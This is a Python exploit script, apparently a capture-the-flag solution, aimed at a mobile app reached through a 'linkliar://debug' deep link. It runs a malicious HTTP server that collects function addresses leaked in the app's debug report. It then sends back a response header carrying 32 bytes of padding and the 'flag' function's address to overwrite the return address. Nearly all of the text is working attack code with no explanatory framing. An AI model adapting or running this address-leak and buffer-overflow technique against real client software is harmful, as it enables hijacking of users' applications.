#!/usr/bin/env python3
import json
import struct
import socket
import threading

debug_addrs = []

def to_little_endian(addr_str):
    """Convert hex address string to little-endian bytes"""
    addr_int = int(addr_str, 16)
    return struct.pack('<Q', addr_int).rstrip(b'\x00')

class ExploitServer:
    def __init__(self, host='0.0.0.0', port=8000):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[*] Exploit server running on http://{self.host}:{self.port}")
        print("[*] Step 1: Set debug URL with deep link")
        print(f"    $ open 'linkliar://debug?url=http://{self.host}:{self.port}'")
        print("[*] Step 2: Scan any URL to trigger exploit")
        
        while True:
            client_socket, address = self.server_socket.accept()
            print(f"\n[+] Connection from {address}")
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()
    
    def handle_client(self, client_socket):
        try:
            # Receive request
            request_data = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                request_data += chunk
                if b"\r\n\r\n" in request_data:
                    break
            
            request_str = request_data.decode('utf-8', errors='ignore')
            headers_part, _, body_part = request_str.partition('\r\n\r\n')
            method = headers_part.splitlines()[0].split(' ')[0]
            
            if method == 'POST':
                self.handle_post(client_socket, body_part)
            elif method == 'GET':
                self.handle_get(client_socket)
            else:
                client_socket.sendall(b"HTTP/1.1 405 Method Not Allowed\r\n\r\n")
        
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            client_socket.close()
    
    def handle_post(self, client_socket, body_part):
        """Extract flag address from debug report"""
        global debug_addrs
        
        # Display the raw POST body
        print("\n" + "="*60)
        print("POST Request Body:")
        print("="*60)
        print(body_part)
        print("="*60 + "\n")
        
        try:
            data = json.loads(body_part)
            if 'debug_data' in data:
                debug_addrs = [entry['addr'] for entry in data['debug_data']]
                print(f"[*] Received {len(debug_addrs)} addresses:")
                for i, addr in enumerate(debug_addrs[:3]):
                    print(f"    {i}: {addr}")
                
                if len(debug_addrs) >= 2:
                    print(f"[+] Flag function address: {debug_addrs[1]}")
            
            client_socket.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/json\r\n"
                b"\r\n"
                b'{"status": "ok"}'
            )
        except json.JSONDecodeError as e:
            print(f"[!] Invalid JSON in POST body: {e}")
            print("[!] Raw body content:")
            print(body_part[:500])  # Print first 500 chars if it's long
            client_socket.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
        except Exception as e:
            print(f"[!] POST handling error: {e}")
            client_socket.sendall(b"HTTP/1.1 400 Bad Request\r\n\r\n")
    
    def handle_get(self, client_socket):
        """Deliver overflow payload in HTTP response header"""
        global debug_addrs
        
        if len(debug_addrs) < 2:
            print("[!] No flag address received yet")
            client_socket.sendall(b"HTTP/1.1 503 Service Unavailable\r\n\r\n")
            return
        
        # Get flag function address
        flag_addr = debug_addrs[1]
        le_addr = to_little_endian(flag_addr)
        
        # Craft payload
        padding = b"A" * 32  # Offset to return address
        payload = padding + le_addr
        
        print(f"[*] Sending exploit payload:")
        print(f"    Flag address: {flag_addr}")
        print(f"    LE bytes: {le_addr.hex()}")
        print(f"    Payload length: {len(payload)}")
        
        # Send malicious HTTP response
        response = (
            b"HTTP/1.1 200 OK\r\n" +
            payload + b": exploit-header\r\n" +
            b"\r\n" +
            b'{"status": "ok"}'
        )
        
        client_socket.sendall(response)
        print("[+] Exploit delivered! Waiting for flag...\n")

if __name__ == "__main__":
    server = ExploitServer('0.0.0.0', 8000)
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[!] Exploit server stopped")